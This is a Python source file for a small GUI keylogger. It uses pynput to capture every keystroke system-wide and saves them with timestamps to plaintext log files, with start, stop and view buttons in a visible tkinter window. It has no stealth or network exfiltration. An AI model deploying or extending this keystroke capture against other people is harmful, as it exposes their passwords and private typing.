import tkinter as tk
from tkinter import messagebox, scrolledtext
import threading
import os
import logging
from datetime import datetime
from pynput import keyboard

class KeyloggerGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("Keylogger - KD")
        self.root.geometry("600x450")
        self.root.resizable(False, False)

        # Dark theme colors
        self.bg_color = "#1e1e1e"
        self.fg_color = "#ffffff"
        self.btn_color = "#3a3a3a"
        self.active_btn_color = "#5c5c5c"
        self.text_bg = "#2d2d2d"

        self.root.configure(bg=self.bg_color)

        self.is_logging = False
        self.listener = None
        self.log_file = None

        self.status_label = tk.Label(root, text="Status: Idle", fg="#5ccfe6", bg=self.bg_color, font=("Consolas", 12))
        self.status_label.pack(pady=10)

        self.start_btn = tk.Button(root, text="▶ Start Logging", bg=self.btn_color, fg=self.fg_color,
                                   activebackground=self.active_btn_color, width=20, command=self.start_logging)
        self.start_btn.pack(pady=5)

        self.stop_btn = tk.Button(root, text="■ Stop Logging", bg=self.btn_color, fg=self.fg_color,
                                  activebackground=self.active_btn_color, width=20, state=tk.DISABLED, command=self.stop_logging)
        self.stop_btn.pack(pady=5)

        self.view_btn = tk.Button(root, text="📄 View Latest Log", bg=self.btn_color, fg=self.fg_color,
                                  activebackground=self.active_btn_color, width=20, command=self.view_log)
        self.view_btn.pack(pady=10)

        self.text_area = scrolledtext.ScrolledText(root, height=12, width=70, bg=self.text_bg, fg=self.fg_color,
                                                   insertbackground=self.fg_color, font=("Courier New", 10))
        self.text_area.pack(padx=10, pady=10)

    def start_logging(self):
        if not os.path.exists("logs"):
            os.makedirs("logs")

        self.log_file = f"logs/keystrokes-{datetime.now().strftime('%Y-%m-%d_%H-%M-%S')}.txt"
        logging.basicConfig(
            filename=self.log_file,
            level=logging.DEBUG,
            format='%(asctime)s: %(message)s'
        )

        self.listener = keyboard.Listener(on_press=self.on_press)
        self.listener.start()

        self.is_logging = True
        self.status_label.config(text="Status: Logging", fg="#7CFC00")
        self.start_btn.config(state=tk.DISABLED)
        self.stop_btn.config(state=tk.NORMAL)

    def stop_logging(self):
        if self.listener:
            self.listener.stop()
            self.listener = None

        self.is_logging = False
        self.status_label.config(text="Status: Stopped", fg="#FF5555")
        self.start_btn.config(state=tk.NORMAL)
        self.stop_btn.config(state=tk.DISABLED)

    def on_press(self, key):
        try:
            logging.info(f"Key pressed: {key.char}")
        except AttributeError:
            logging.info(f"Special key: {key}")

    def view_log(self):
        if not self.log_file or not os.path.exists(self.log_file):
            messagebox.showinfo("No Log", "No log file available yet.")
            return
        with open(self.log_file, 'r') as f:
            content = f.read()
        self.text_area.delete(1.0, tk.END)
        self.text_area.insert(tk.END, content)

if __name__ == "__main__":
    root = tk.Tk()
    app = KeyloggerGUI(root)
    root.mainloop()
